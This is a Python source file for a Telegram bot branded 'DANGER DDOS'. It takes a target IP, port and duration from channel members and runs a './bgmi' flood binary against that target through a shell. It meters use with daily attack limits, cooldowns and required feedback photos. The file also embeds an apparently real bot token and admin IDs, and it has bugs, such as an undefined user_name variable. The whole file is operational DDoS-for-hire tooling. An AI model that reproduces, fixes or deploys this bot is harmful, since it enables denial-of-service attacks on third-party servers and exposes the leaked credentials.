import os
import telebot
import logging
import asyncio
from datetime import datetime, timedelta, timezone

# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Telegram bot token and channel ID
TOKEN = '8122984030:AAFUES-cStbgKJ7Ohvo0ee_R0YrmEAaHiuE'  # Replace with your actual bot token
ADMIN_IDS = [6239926262,1604629264]  # Added new admin ID
OWNER_ID = 6239926262,1604629264
CHANNEL_ID = '-1002282530853' # Replace with your specific channel or group ID
# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# Dictionary to track user attack counts, cooldowns, photo feedbacks, and bans
user_attacks = {}
user_cooldowns = {}
user_photos = {}  # Tracks whether a user has sent a photo as feedback
user_bans = {}  # Tracks user ban status and ban expiry time
reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=10))).replace(hour=0, minute=0, second=0, microsecond=0)

# Cooldown duration (in seconds)
COOLDOWN_DURATION = 30  # 5 minutes
BAN_DURATION = timedelta(minutes=1)  
DAILY_ATTACK_LIMIT = 15  # Daily attack limit per user

# Private channel username (not ID)
PRIVATE_CHANNEL_USERNAME = "@DANGER_DDOS"  # Example: "MyPrivateChannel"
PRIVATE_CHANNEL_LINK = "https://t.me/DANGER_DDOS"  # Replace with actual link

# List of user IDs exempted from cooldown, limits, and photo requirements
EXEMPTED_USERS = [6239926262, 1604629264]
# List of blocked ports
BLOCKED_PORTS = [80, 443, 22, 3389, 8080, 8700, 20000, 443, 17500, 9031, 20002, 20001]  # Add any ports you want to block
# Track active attacks
active_attacks = 0  
MAX_ACTIVE_ATTACKS = 3  # Maximum number of running attacks

def reset_daily_counts():
    """Reset the daily attack counts and other data at 12 AM IST."""
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=10)))
    if ist_now >= reset_time + timedelta(days=1):
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)


# Function to validate IP address
def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

# Function to validate port number
def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535 and int(port) not in BLOCKED_PORTS

# Function to validate duration
def is_valid_duration(duration):
    return duration.isdigit() and int(duration) > 0

# start Command Handler 
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(
        message.chat.id,
        "✨🔥  𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝘿𝙀𝙉𝙂𝙀𝙍 𝘿𝘿𝙊𝙎 🔥✨\n\n"
        "🚀 *Hello, Commander!* ⚡\n"
        "🎯 *Get ready to dominate the battlefield!* 🏆\n\n"
        "💀 *𝙏𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙨 𝙙𝙚𝙨𝙞𝙜𝙣𝙚𝙙 𝙩𝙤 𝙝𝙚𝙡𝙥 𝙮𝙤𝙪 𝙖𝙩𝙩𝙖𝙘𝙠 & 𝙙𝙚𝙛𝙚𝙣𝙙!* 💀\n\n"
        "⚡ *Use* `/help` *to explore all commands!* 📜"
    )

@bot.message_handler(commands=['info'])
def info(message):
    info_text = (
        "ℹ️ *Bot Information*\n\n"
        "Version: 3.0\n"
        "Developed And Design by: @LostBoiXD\n"
        "This bot is designed to execute specific commands and provide quick responses."
    )
    bot.reply_to(message, info_text, parse_mode="Markdown")

@bot.message_handler(commands=['shutdown'])
def shutdown(message):
    user_id = message.from_user.id
    if user_id != OWNER_ID:
        bot.reply_to(message, "🚫 You are not authorized to shut down the bot.")
        return
    bot.reply_to(message, "🔻 Shutting down the bot. Goodbye!")
    bot.stop_polling()
   
   # help Command - Stylish Help Menu
@bot.message_handler(commands=['help'])
def show_help(message):
    response = (
        "🚀 𝙐𝙎𝙀𝙍 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎 🚀\n"
        "🎮 `/start` - ✨ 𝘽𝙚𝙜𝙞𝙣 𝙮𝙤𝙪𝙧 𝙟𝙤𝙪𝙧𝙣𝙚𝙮!\n"
        "📜 `/help` - 🏆 𝙑𝙞𝙚𝙬 𝙩𝙝𝙞𝙨 𝙚𝙥𝙞𝙘 𝙢𝙚𝙣𝙪!\n"
        "⚡ `/status` - 🚀 𝘾𝙝𝙚𝙖𝙠 𝙔𝙤𝙪𝙧 𝘽𝙖𝙩𝙩𝙡𝙚𝙛𝙞𝙚𝙡𝙙 𝙎𝙩𝙖𝙩𝙪𝙨\n"
        "💀 `/bgmi` - 🎯 𝙇𝙖𝙪𝙣𝙘𝙝 𝙮𝙤𝙪𝙧 𝘼𝙩𝙩𝙖𝙘𝙠\n"
        "📸 𝙎𝙚𝙣𝙙 𝙖 𝙋𝙝𝙤𝙩𝙤 - 𝙎𝙪𝙗𝙢𝙞𝙩 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝘾𝙤𝙢𝙥𝙪𝙡𝙨𝙤𝙧𝙮\n\n"
        "[Join Channel](https://t.me/DANGER_DDOS)"
    )

    response = bot.send_message(message, response, parse_mode="Markdown", disable_web_page_preview=True)
   
   #PAPA bgmi_LostBoiXD
# 🛡️ 『 𝑺𝒕𝒂𝒕𝒖𝒔 𝑪𝒐𝒎𝒎𝒂𝒏𝒅 』🛡️
@bot.message_handler(commands=['status'])
def check_status(message):
    user_id = message.from_user.id
    remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
    cooldown_end = user_cooldowns.get(user_id)
    cooldown_time = max(0, (cooldown_end - datetime.now()).seconds) if cooldown_end else 0

    response = (
        "𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎\n\n"
        f"𝙐𝙨𝙚𝙧 {message.from_user.first_name}\n"
        f"𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 𝘼𝙩𝙩𝙖𝙘𝙠𝙨`{remaining_attacks}` \n"
        f"𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙏𝙞𝙢𝙚`{cooldown_time} seconds`\n\n"
        "🚀𝙆𝙀𝙀𝙋 𝙎𝙐𝙋𝙋𝙊𝙍𝙏𝙄𝙉𝙂 𝘼𝙉𝘿 𝙒𝙄𝙉 𝙏𝙃𝙀 𝘽𝘼𝙏𝙏𝙇𝙀!⚡"
    )

    response = bot.reply_to(message, response, parse_mode="Markdown")

  
  # 🔄 『 𝑹𝒆𝒔𝒆𝒕 𝑨𝒕𝒕𝒂𝒄𝒌 𝑳𝒊𝒎𝒊𝒕𝒔 』🔄
@bot.message_handler(commands=['reset'])
def reset_attack_limit(message):
    owner_id = 6882674372  # Replace with the actual owner ID
    if message.from_user.id != owner_id:
        response = (
            "❌ *ACCESS DENIED!*\n\n"
            "*𝘠𝘰𝘶 𝘥𝘰 𝘯𝘰𝘵 𝘩𝘢𝘷𝘦 𝘱𝘦𝘳𝘮𝘪𝘴𝘴𝘪𝘰𝘯 𝘵𝘰 𝘶𝘴𝘦 𝘵𝘩𝘪𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥!*\n\n"
            "*𝘖𝘯𝘭𝘺 𝘵𝘩𝘦 𝘉𝘖𝘚𝘚 𝘤𝘢𝘯 𝘦𝘹𝘦𝘤𝘶𝘵𝘦 𝘵𝘩𝘪𝘴!*"
        )
        response = bot.reply_to(message, response, parse_mode="Markdown")
        return
    
    # Reset the attack count
    user_attacks.clear()

    response = (
        " 𝗦𝗬𝗦𝗧𝗘𝗠 𝗥𝗘𝗦𝗘𝗧 𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗘𝗗\n"
        "*𝗔𝗟𝗟 𝗗𝗔𝗜𝗟𝗬 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗜𝗠𝗜𝗧𝗦 𝗛𝗔𝗩𝗘 𝗕𝗘𝗘𝗡 𝗥𝗘𝗦𝗘𝗧!*\n\n"
        "*𝗨𝘀𝗲𝗿𝘀 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘀𝘁𝗮𝗿𝘁 𝗻𝗲𝘄 𝗮𝘁𝘁𝗮𝗰𝗸𝘀!*\n"
        "*𝗣𝗿𝗲𝗽𝗮𝗿𝗲 𝗳𝗼𝗿 𝗗𝗢𝗠𝗜𝗡𝗔𝗧𝗜𝗢𝗡!*\n"
        "[DENGEROP](https://t.me/DANGER_DDOS)"
    )

    response = bot.reply_to(message, response, parse_mode="Markdown", disable_web_page_preview=True)


# Handler for photos sent by users (feedback received)
# Define the feedback channel ID
FEEDBACK_CHANNEL_ID = "-1002431196846"  # Replace with your actual feedback channel ID

# Store the last feedback photo ID for each user to detect duplicates
last_feedback_photo = {}

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    photo_id = message.photo[-1].file_id  # Get the latest photo ID

    # Check if the user has sent the same feedback before & give a warning
    if last_feedback_photo.get(user_id) == photo_id:
        response = (
            "𝗪𝗔𝗥𝗡𝗜𝗡𝗚: SAME 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞\n\n"
            "𝖸𝖮𝖴 𝖧𝖠𝖵𝖤 𝖲𝖤𝖭𝖳 𝖳𝖧𝖨𝖲 𝖥𝖤𝖤𝖣𝖡𝖠𝖢𝖪 𝘽𝙀𝙁𝙊𝙍𝙀\n"
            "𝙋𝙇𝙀𝘼𝙎𝙀 𝘼𝙑𝙊𝙄𝘿 𝙍𝙀𝙎𝙀𝙉𝘿𝙄𝙉𝙂 𝙏𝙃𝙀 𝙎𝘼𝙈𝙀 𝙋𝙃𝙊𝙏𝙊\n\n"
            "𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙒𝙄𝙇𝙇 𝙎𝙏𝙄𝙇𝙇 𝘽𝙀 𝙎𝙀𝙉𝙏"
        )
        response = bot.reply_to(message, response)

    # ✅ Store the new feedback ID (this ensures future warnings)
    last_feedback_photo[user_id] = photo_id
    user_photos[user_id] = True  # Mark feedback as given

    # ✅ Stylish Confirmation Message for User
    response = (
        "𝗵𝗮𝗻𝗸 𝘆𝗼𝘂 𝗳𝗼𝗿 𝘆𝗼𝘂𝗿 𝗳𝗲𝗲𝗱𝗯𝗮𝗰𝗸 ✅\n"
        f"*𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍* @{username}\n"
        "𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲 𝘂𝘀𝗶𝗻𝗴 𝘁𝗵𝗲 𝗯𝗼𝘁 ♥️\n"
    )
    response = bot.send_message(message, response)

    # 🔥 Forward the photo to all admins
    for admin_id in ADMIN_IDS:
        bot.forward_message(admin_id, message.chat.id, message.message_id)
        admin_response = (
            " 𝑵𝑬𝑾 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲 𝑹𝑬𝑪𝑬𝑰𝑽𝑬𝑫! \n"
            f"*𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} \n"
            f" *𝙐𝙨𝙚𝙧 𝙄𝘿:* `{user_id}`\n"
            " *𝙏𝙃𝘼𝙉𝙆 𝙔𝙊𝙐 𝙁𝙊𝙍 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!!* \n"
            
        )
        bot.send_message(admin_id, admin_response)

    # 🎯 Forward the photo to the feedback channel
    bot.forward_message(FEEDBACK_CHANNEL_ID, message.chat.id, message.message_id)
    channel_response = (
        "🌟 𝑵𝑬𝑾 𝑷𝑼𝑩𝑳𝑰𝑪 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲!🌟\n"
        f"*𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} \n"
        f"*𝙐𝙨𝙚𝙧 𝙄𝘿:* `{user_id}`\n"
        "*𝙐𝙎𝙀𝙍 𝙃𝘼𝙎 𝙎𝙃𝘼𝙍𝙀𝘿 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆.!* \n"
        " *𝙆𝙀𝙀𝙋 𝙎𝙐𝙋𝙋𝙊𝙍𝙏𝙄𝙉𝙂 & 𝙎𝙃𝘼𝙍𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!* "
    )
    bot.send_message(FEEDBACK_CHANNEL_ID, channel_response)


# /bgmi Command with Automatic Verification
@bot.message_handler(commands=['denger'])
def bgmi_command(message):
    user_id = message.from_user.id

    try:
        # ✅ Check if user is a member of the channel
        chat_member = bot.get_chat_member(f"@{PRIVATE_CHANNEL_USERNAME}", user_id)
        if chat_member.status not in ["member", "administrator", "creator"]:
            bot.send_message(
                message.chat.id,
                f" *ACCESS DENIED!*\n\n"
                f" [Join Our Channel]({PRIVATE_CHANNEL_LINK}) to use this command.\n"
                "📌After joining, try `/bgmi` again!",
                parse_mode="Markdown"
            )
            return  # Stop execution if user is not a member

    except Exception:
        bot.send_message(
            message.chat.id,
            f"⚠️*Error Verifying Your Membership!* ⚠️\n\n"
            f" Make sure you have joined: [Click Here]({PRIVATE_CHANNEL_LINK})",
            parse_mode="Markdown"
        )
        return  # Stop execution in case of an error

# Check if the number of running attacks is at the limit
    if active_attacks >= MAX_ACTIVE_ATTACKS:
        bot.send_message(
            message.chat.id,
            "⚠️𝗕𝗛𝗔𝗜 𝗦𝗔𝗕𝗥 𝗥𝗔𝗞𝗛𝗢! 𝗔𝗕𝗛𝗜 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗛𝗔𝗟 𝗥𝗔𝗛𝗘 𝗛𝗔𝗜! 🚀, \n\n ATTACK FINISH HONE DE."
        )
        return

    # Ensure the bot only works in the specified channel or group
    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(message.chat.id, " ⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 𝐂𝐎𝐌𝐄 𝐈𝐍 𝐆𝐑𝐎𝐔𝐏 :- @DANGER_DDOS [ PAPA KA GROUP PA AAJA ] ⚠️⚠️ \n\n[ 𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬 :𝗗𝗘𝗡𝗚𝗘𝗥 𝗗𝗗𝗢𝗦 ( TUMHARE_PAPA ) | 𝗗𝗠 𝗙𝗢𝗥 𝗥𝗘𝗕𝗥𝗔𝗡𝗗𝗜𝗡𝗚 ]")
        return

    # Reset counts daily
    reset_daily_counts()

    # Check if the user is banned
    if user_id in user_bans:
        ban_expiry = user_bans[user_id]
        if datetime.now() < ban_expiry:
            remaining_ban_time = (ban_expiry - datetime.now()).total_seconds()
            minutes, seconds = divmod(remaining_ban_time, 60)
            bot.send_message(
                message.chat.id,
                f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 𝙣𝙤𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙞𝙣𝙜 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 !  ⚠️⚠️"
            )
            return
        else:
            del user_bans[user_id]  # Remove ban after expiry

    # Check if user is exempted from cooldowns, limits, and feedback requirements
    if user_id not in EXEMPTED_USERS:
        # Check if user is in cooldown
        if user_id in user_cooldowns:
            cooldown_time = user_cooldowns[user_id]
            if datetime.now() < cooldown_time:
                remaining_time = (cooldown_time - datetime.now()).seconds
                bot.send_message(
                    message.chat.id,
                    f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {remaining_time // 60} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {remaining_time % 60} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 ⚠️⚠️ "
                )
                return

        # Check attack count
        if user_id not in user_attacks:
            user_attacks[user_id] = 0

        if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
            bot.send_message(
                message.chat.id,
                f"𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙝𝙖𝙫𝙚 𝙧𝙚𝙖𝙘𝙝𝙚𝙙 𝙩𝙝𝙚 𝙢𝙖𝙭𝙞𝙢𝙪𝙢 𝙣𝙪𝙢𝙗𝙚𝙧 𝙤𝙛 𝙖𝙩𝙩𝙖𝙘𝙠-𝙡𝙞𝙢𝙞𝙩 𝙛𝙤𝙧 𝙩𝙤𝙙𝙖𝙮, 𝘾𝙤𝙢𝙚𝘽𝙖𝙘𝙠 𝙏𝙤𝙢𝙤𝙧𝙧𝙤𝙬 ✌️"
            )
            return

        # Check if the user has provided feedback after the last attack
        if user_id in user_attacks and user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
            user_bans[user_id] = datetime.now() + BAN_DURATION  # Ban user for 2 hours
            bot.send_message(
                message.chat.id,
                f"𝙃𝙞 {message.from_user.first_name}, ⚠️⚠️𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙖𝙛𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙡𝙖𝙨𝙩 𝙖𝙩𝙩𝙖𝙘𝙠. 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙧𝙤𝙢 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 30 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️⚠️"
            )
            return

    # Split the command to get parameters
    try:
        args = message.text.split()[1:]  # Skip the command itself
        logging.info(f"Received arguments: {args}")

        if len(args) != 3:
            raise ValueError("𝗗𝗘𝗡𝗚𝗘𝗥 𝗗𝗗𝗢𝗦™ 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n ⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩\n /𝗱𝗲𝗻𝗴𝗲𝗿 <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝘁𝗮𝗿𝗴𝗲𝘁_𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")

        target_ip, target_port, user_duration = args

        # ✅ Check if the port is blocked
        if int(target_port) in BLOCKED_PORTS:
            raise ValueError(f"‼️𝙩𝙝𝙞𝙨 𝙥𝙤𝙧𝙩 {target_port} 𝙞𝙨 𝙗𝙡𝙤𝙘𝙠𝙚𝙙\n𝘾𝙝𝙤𝙤𝙨𝙚 𝙖 𝙙𝙞𝙛𝙛𝙚𝙧𝙚𝙣𝙩 𝙥𝙤𝙧𝙩‼️")
            
        # Validate inputs
        if not is_valid_ip(target_ip):
            raise ValueError("Invalid IP address.")
        if not is_valid_port(target_port):
            raise ValueError("Invalid port number.")
        if not is_valid_duration(user_duration):
            raise ValueError("Invalid duration. Must be a positive integer.")

        # Increment attack count for non-exempted users
        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] += 1
            user_photos[user_id] = False  # Reset photo feedback requirement

        # Set cooldown for non-exempted users
        if user_id not in EXEMPTED_USERS:
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        # Notify that the attack will run for the default duration of 150 seconds, but display the input duration
        default_duration = 120
        bot.send_message(
            message.chat.id,
            f"🚀𝙃𝙞 {message.from_user.first_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 {target_ip} : {target_port} 𝙛𝙤𝙧 {default_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 ] \n\n❗️❗️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 ❗️❗️"
        )

        # Log the attack started message
        logging.info(f"Attack started by {user_name}: ./bgmi {target_ip} {target_port} {default_duration} 800")

        # Run the attack command with the default duration and pass the user-provided duration for the finish message
        asyncio.run(run_attack_command_async(target_ip, int(target_port), default_duration, user_duration, user_name))

    except Exception as e:
        bot.send_message(message.chat.id, str(e))

async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
    try:
        command = f"./bgmi {target_ip} {target_port} {duration} 800"
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()
        bot.send_message(CHANNEL_ID, f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 {target_ip} : {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰?? <> 𝗧𝗲𝗮𝗺 𝗗𝗘𝗡𝗚𝗘𝗥 𝗗𝗗𝗢𝗦™")
    except Exception as e:
        bot.send_message(CHANNEL_ID, f"Error running attack command: {e}")

# Start the bot
if __name__ == "__main__":
    logging.info("Bot is starting...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"An error occurred: {e}")

